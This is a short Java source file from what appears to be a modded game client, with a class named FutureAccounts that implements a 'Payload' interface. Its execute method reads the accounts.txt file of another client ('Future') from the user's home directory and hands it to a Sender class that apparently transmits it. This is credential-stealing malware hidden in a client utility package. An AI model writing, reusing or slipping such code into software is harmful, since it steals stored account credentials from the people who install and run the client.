package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.util.Optional;

public final class FutureAccounts implements Payload {
   public void execute() {
      Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\accounts.txt");
      file.ifPresent(Sender::send);
   }
}
